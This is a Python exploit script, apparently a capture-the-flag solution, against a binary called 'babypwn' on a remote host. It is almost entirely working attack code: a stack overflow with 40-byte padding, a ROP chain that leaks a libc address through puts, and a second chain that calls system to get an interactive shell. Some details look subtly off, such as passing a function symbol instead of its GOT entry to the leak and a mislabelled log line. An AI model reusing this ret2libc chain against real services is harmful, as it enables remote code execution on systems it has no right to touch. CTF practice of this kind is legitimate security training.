#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./babypwn')

host = args.HOST or '194.5.207.56'
port = int(args.PORT or 7010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+151
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.28.so")

re()
# sl(b"A"*40 + ret2libcleak('__libc_start_main'))
# __libc_start_main = uu64(rl().strip(b'\n'))
# log.info(f"libc start main : {hex(__libc_start_main)}")
# re()
# sl(b"A"*40 + p64(exe.sym.wow) + ret2libcleak('puts'))
# __libc_start_main = uu64(rl().strip(b'\n'))

padding = b"A"*40
payload = flat([

    padding,
    0x00000000401423, # pop rdi; ret
    # 0x403ff0, #libc start main
    exe.sym['__libc_start_main'],
    exe.sym['puts'],
    exe.sym['main']

])
# libcbase = address of libc start main - offset of __libc_start_main
io.sendline(payload)
leak = io.recvline().strip(b"\n")
leak = u64(leak.ljust(8, b"\x00")) - libc.sym['__libc_start_main']
libc.address = leak
log.info(f"__libc_start_main : {hex(leak)}")

payload = flat([

    padding,
    0x00000000401423, # pop rdi; ret
    # 0x403ff0, #libc start main
    libc.address+0x181519,
    libc.sym['system'],

])
io.sendline(payload)



io.interactive()

